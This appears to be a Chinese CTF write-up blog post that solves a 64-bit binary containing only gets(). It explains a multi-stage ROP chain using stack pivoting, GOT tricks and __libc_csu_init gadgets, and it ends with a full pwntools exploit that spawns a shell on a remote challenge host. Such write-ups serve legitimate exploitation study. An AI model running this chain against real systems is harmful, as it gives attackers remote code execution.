---
title: Gets一把梭
date: 2019-03-07 12:50:23
tags: [ctf, pwn]
---

如果程序只有一个 `gets()`。

<!-- more -->

# Checksec

checksec：

```
[*] '/home/assassinq/pwn/r3t/GETS/gets'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# Main Function

只有一个 main 函数，就给了一个 `gets()`：

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-10h]

  gets(&v4, argv, envp);
  return 0;
}
```

# Solution

这道题的思路主要是泄漏出 gets 的真实地址，然后利用给出的 libc 计算出 gets 与 system 之间的 offset 得到 system 的地址，最后读入 sh，执行 system 拿到 shell。

# Gadgets

先放上会用到的 gadgets：

```python
g = lambda x: next(elf.search(asm(x)))
pop_rsp_r13_r14_r15_ret = g('pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret')
pop_rbp_ret = g('pop rbp ; ret')
pop_rdi_ret = g('pop rdi ; ret')
pop_r15_ret = g('pop r15 ; ret')
pop_rsi_r15_ret = g('pop rsi ; pop r15 ; ret')
pop_rbp_r14_r15_ret = g('pop rbp ; pop r14 ; pop r15 ; ret')
pop_rbx_rbp_r12_r13_r14_r15_ret = g('pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret')
add_ebx_esi_ret = g('add ebx, esi ; ret')
leave_ret = g('leave ; ret')
call_at_r12 = g('call QWORD PTR [r12+rbx*8]')
```

# Buf

因为操作很多，我们需要通过栈迁移来达到目的，所以使用了很多 bss 段上的空间：

```python
bss = 0x602000
buf1 = bss - 0x100
buf2 = bss - 0x200
buf3 = bss - 0x300
buf4 = bss - 0x400
buf5 = bss - 0x500
buf6 = bss - 0x600
buf7 = bss - 0x700
buf8 = bss - 0x800
```

# Analyse

第一个 rop 将所有的 buf 用 gets 读上来。并且最后通过 `leave ; ret` 跳到 buf1 上：

```python
rop1 = [
	pop_rdi_ret, buf1, gets_plt, # rop2
	pop_rdi_ret, buf2, gets_plt, # rop4
	pop_rdi_ret, buf3, gets_plt, # rop5
	pop_rdi_ret, buf4, gets_plt, # rop7
	pop_rdi_ret, buf5, gets_plt, # rop9
	pop_rdi_ret, buf6, gets_plt, # rop10
	pop_rdi_ret, buf7, gets_plt, # rop13
	pop_rbp_ret, buf1 - 8, leave_ret
]
```

第二个 rop 为我们读入 buf1 的内容。先看看这里 gets 的 got 表处的情况：

```asm
.got.plt:0000000000601020 off_601020      dq offset gets          ; DATA XREF: _gets↑r
.got.plt:0000000000601020 _got_plt        ends
.got.plt:0000000000601020
.data:0000000000601028 ; ===========================================================================
.data:0000000000601028
.data:0000000000601028 ; Segment type: Pure data
.data:0000000000601028 ; Segment permissions: Read/Write
.data:0000000000601028 ; Segment alignment 'qword' can not be represented in assembly
.data:0000000000601028 _data           segment para public 'DATA' use64
.data:0000000000601028                 assume cs:_data
.data:0000000000601028                 ;org 601028h
.data:0000000000601028                 public __data_start ; weak
.data:0000000000601028 __data_start    db    0                 ; Alternative name is '__data_start'
.data:0000000000601028                                         ; data_start
.data:0000000000601029                 db    0
.data:000000000060102A                 db    0
```

got 表在这里是只读的，但在后面的 data 段是可写的。我们可以先在 gets 地址后面 24byte 的地方填上 `leave ; ret`，然后为跳转到 buf2 提前设好 rbp。最后利用 `pop_rsp_r13_r14_r15_ret` 把 gets 的地址放到 r13 上。前面可以。同时接上第三个 rop 送上去的 `leave_ret`：

```python
rop2 = [ # buf1
	pop_rdi_ret, gets_got + 24, gets_plt, # rop3
	pop_rbp_ret, buf2 - 8,
	pop_rsp_r13_r14_r15_ret, gets_got
]

rop3 = [ # gets_got + 24
	leave_ret
]
```

然后接下来需要用到 `__libc_csu_init()` 这个函数：

```asm
.text:0000000000400550 ; void _libc_csu_init(void)
.text:0000000000400550                 public __libc_csu_init
.text:0000000000400550 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
.text:0000000000400550 ; __unwind {
.text:0000000000400550                 push    r15
.text:0000000000400552                 push    r14
.text:0000000000400554                 mov     r15d, edi
.text:0000000000400557                 push    r13
.text:0000000000400559                 push    r12
.text:000000000040055B                 lea     r12, __frame_dummy_init_array_entry
.text:0000000000400562                 push    rbp
.text:0000000000400563                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:000000000040056A                 push    rbx
.text:000000000040056B                 mov     r14, rsi
.text:000000000040056E                 mov     r13, rdx
.text:0000000000400571                 sub     rbp, r12
.text:0000000000400574                 sub     rsp, 8
.text:0000000000400578                 sar     rbp, 3
.text:000000000040057C                 call    _init_proc
.text:0000000000400581                 test    rbp, rbp
.text:0000000000400584                 jz      short loc_4005A6
.text:0000000000400586                 xor     ebx, ebx
.text:0000000000400588                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400590
.text:0000000000400590 loc_400590:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400590                 mov     rdx, r13
.text:0000000000400593                 mov     rsi, r14
.text:0000000000400596                 mov     edi, r15d
.text:0000000000400599                 call    qword ptr [r12+rbx*8]
.text:000000000040059D                 add     rbx, 1
.text:00000000004005A1                 cmp     rbx, rbp
.text:00000000004005A4                 jnz     short loc_400590
.text:00000000004005A6
.text:00000000004005A6 loc_4005A6:                             ; CODE XREF: __libc_csu_init+34↑j
.text:00000000004005A6                 add     rsp, 8
.text:00000000004005AA                 pop     rbx
.text:00000000004005AB                 pop     rbp
.text:00000000004005AC                 pop     r12
.text:00000000004005AE                 pop     r13
.text:00000000004005B0                 pop     r14
.text:00000000004005B2                 pop     r15
.text:00000000004005B4                 retn
.text:00000000004005B4 ; } // starts at 400550
.text:00000000004005B4 __libc_csu_init endp
```

实际上 `__libc_csu_init()` 没有做任何事情，无论我们调用多少次都是一样的。我们先通过第四个 rop 把它写到 buf2 上，后面再解释需要做什么：

```python
rop4 = [ # buf2
	libc_csu_init,
	pop_rbp_ret, buf3 - 8, leave_ret
]
```

第五个 rop 往 buf2-24 和 buf2+32 的地方写东西，之后再跳上去。因为之前 gets 的地址已经被 pop 到了 r13 上，然后走一次 `__libc_csu_init()` 会 push 到栈上，这个时候也就是 buf2，之后接上一个 `pop rbx` 就能给 rbx。然后为了得到 system 的地址，我们需要用 `add_ebx_esi_ret` 把两者加起来。加完之后再把 ebx 放回栈上，也就是 buf2：

```python
rop5 = [ # buf3
	pop_rdi_ret, buf2 - 24, gets_plt, # rop6_1
	pop_rdi_ret, buf2 + 32, gets_plt, # rop6_2
	pop_rbp_ret, buf2 - 24 - 8, leave_ret
]

rop6_1 = [ # buf2 - 24
	pop_rbx_rbp_r12_r13_r14_r15_ret
]

rop6_2 = [ # buf2 + 32
	pop_rsi_r15_ret, offset, 8,
	add_ebx_esi_ret,
	libc_csu_init,
	pop_rbp_ret, buf4 - 8, leave_ret
]
```

加完之后发现只留了地址的低四位，高四位被弄丢了。我们需要做的就是把所有的 offset 加上 4，这样同样的做法我们就能拿到高四位的值。因为栈其实是不需要对齐的，所以这样做是可以的。这样的话之后的操作大部分细节和之前是一样的，后面就不用加 offset 了。然后需要计算一下之前的低四位在栈上的什么地方，计算好位置之后读上去：

```python
rop7 = [ # buf4
	pop_rdi_ret, gets_got + 28, gets_plt, # rop8
	pop_rbp_ret, buf5 - 8,
	pop_rsp_r13_r14_r15_ret, gets_got + 4
]

rop8 = [ # gets_got + 28
	leave_ret
]

rop9 = [ # buf5
	libc_csu_init,
	pop_rbp_ret, buf6 - 8, leave_ret
]

rop10 = [ # buf6
	pop_rdi_ret, buf5 - 24, gets_plt, # rop11_1
	pop_rdi_ret, buf5 + 32, gets_plt, # rop11_2
	pop_rbp_ret, buf5 - 24 - 8, leave_ret
]

rop11_1 = [ # buf5 - 24
	pop_rbx_rbp_r12_r13_r14_r15_ret
]

rop11_2 = [ # buf5 + 32
	pop_rdi_ret, buf2 + 68, gets_plt, # rop12
	pop_rbp_ret, buf2 + 68 - 8, leave_ret
]

rop12 = [ # buf2 + 164
	libc_csu_init,
	pop_rbp_ret, buf7 - 8, leave_ret
]
```

最后 system 的地址已经在栈上了，读一下参数，利用`__libc_csu_init()`调用一下就行了：

```python
rop13 = [
	pop_rdi_ret, buf8, gets_plt, # shell command
	pop_rdi_ret, buf8,
	pop_rbx_rbp_r12_r13_r14_r15_ret, 0, 0, buf2 + 24, 0, 0, 0,
	call_at_r12
]
```

# Exploit

```python
#!/usr/bin/env python
from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'
local = 0
if local:
	p = remote('127.0.0.1', 4000)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	p = remote('10.21.13.69', 10010)
	libc = ELF('libc.so.6')
elf = ELF('./gets')
g = lambda x: next(elf.search(asm(x)))
system_offset = libc.symbols['system']
gets_offset = libc.symbols['gets']
offset = system_offset - gets_offset
if offset < 0:
	offset &= 0xffffffff
gets_plt = elf.plt['gets']
gets_got = elf.got['gets']
libc_csu_init = elf.symbols['__libc_csu_init']
pop_rsp_r13_r14_r15_ret = g('pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret')
pop_rbp_ret = g('pop rbp ; ret')
pop_rdi_ret = g('pop rdi ; ret')
pop_r15_ret = g('pop r15 ; ret')
pop_rsi_r15_ret = g('pop rsi ; pop r15 ; ret')
pop_rbp_r14_r15_ret = g('pop rbp ; pop r14 ; pop r15 ; ret')
pop_rbx_rbp_r12_r13_r14_r15_ret = g('pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret')
add_ebx_esi_ret = g('add ebx, esi ; ret')
leave_ret = g('leave ; ret')
call_at_r12 = g('call QWORD PTR [r12+rbx*8]')
# gdb.attach(p)

bss = 0x602000
buf1 = bss - 0x100
buf2 = bss - 0x200
buf3 = bss - 0x300
buf4 = bss - 0x400
buf5 = bss - 0x500
buf6 = bss - 0x600
buf7 = bss - 0x700
buf8 = bss - 0x800

rop1 = [
	pop_rdi_ret, buf1, gets_plt, # rop2
	pop_rdi_ret, buf2, gets_plt, # rop4
	pop_rdi_ret, buf3, gets_plt, # rop5
	pop_rdi_ret, buf4, gets_plt, # rop7
	pop_rdi_ret, buf5, gets_plt, # rop9
	pop_rdi_ret, buf6, gets_plt, # rop10
	pop_rdi_ret, buf7, gets_plt, # rop13
	pop_rbp_ret, buf1 - 8, leave_ret
]

rop2 = [ # buf1
	pop_rdi_ret, gets_got + 24, gets_plt, # rop3
	pop_rbp_ret, buf2 - 8,
	pop_rsp_r13_r14_r15_ret, gets_got
]

rop3 = [ # gets_got + 24
	leave_ret
]

rop4 = [ # buf2
	libc_csu_init,
	pop_rbp_ret, buf3 - 8, leave_ret
]

rop5 = [ # buf3
	pop_rdi_ret, buf2 - 24, gets_plt, # rop6_1
	pop_rdi_ret, buf2 + 32, gets_plt, # rop6_2
	pop_rbp_ret, buf2 - 24 - 8, leave_ret
]

rop6_1 = [ # buf2 - 24
	pop_rbx_rbp_r12_r13_r14_r15_ret
]

rop6_2 = [ # buf2 + 32
	pop_rsi_r15_ret, offset, 8,
	add_ebx_esi_ret,
#	0xdeadbeef,
	libc_csu_init,
	pop_rbp_ret, buf4 - 8, leave_ret
]

rop7 = [ # buf4
	pop_rdi_ret, gets_got + 28, gets_plt, # rop8
	pop_rbp_ret, buf5 - 8,
	pop_rsp_r13_r14_r15_ret, gets_got + 4
]

rop8 = [ # gets_got + 28
	leave_ret
]

rop9 = [ # buf5
	libc_csu_init,
	pop_rbp_ret, buf6 - 8, leave_ret
]

rop10 = [ # buf6
	pop_rdi_ret, buf5 - 24, gets_plt, # rop11_1
	pop_rdi_ret, buf5 + 32, gets_plt, # rop11_2
	pop_rbp_ret, buf5 - 24 - 8, leave_ret
]

rop11_1 = [ # buf5 - 24
	pop_rbx_rbp_r12_r13_r14_r15_ret
]

rop11_2 = [ # buf5 + 32
	pop_rdi_ret, buf2 + 68, gets_plt, # rop12
	pop_rbp_ret, buf2 + 68 - 8, leave_ret
]

rop12 = [ # buf2 + 164
	libc_csu_init,
	pop_rbp_ret, buf7 - 8, leave_ret
]

rop13 = [
	pop_rdi_ret, buf8, gets_plt, # shell command
	pop_rdi_ret, buf8,
	pop_rbx_rbp_r12_r13_r14_r15_ret, 0, 0, buf2 + 24, 0, 0, 0,
	call_at_r12
]

payload = (
	'A' * 24 +
	''.join(map(p64, rop1)) + '\n' +
	''.join(map(p64, rop2)) + '\n' +
	''.join(map(p64, rop4)) + '\n' +
	''.join(map(p64, rop5)) + '\n' +
	''.join(map(p64, rop7)) + '\n' +
	''.join(map(p64, rop9)) + '\n' +
	''.join(map(p64, rop10)) + '\n' +
	''.join(map(p64, rop13)) + '\n' +
	''.join(map(p64, rop3))[:-1] + '\n' +
	''.join(map(p64, rop6_1))[:-1] + '\n' +
	''.join(map(p64, rop6_2)) + '\n' +
	''.join(map(p64, rop8)) + '\n' +
	''.join(map(p64, rop11_1))[:-1] + '\n' +
	''.join(map(p64, rop11_2)) + '\n' +
	''.join(map(p64, rop12)) + '\n' +
	'sh\n'
)
p.send(payload)
p.interactive()
```
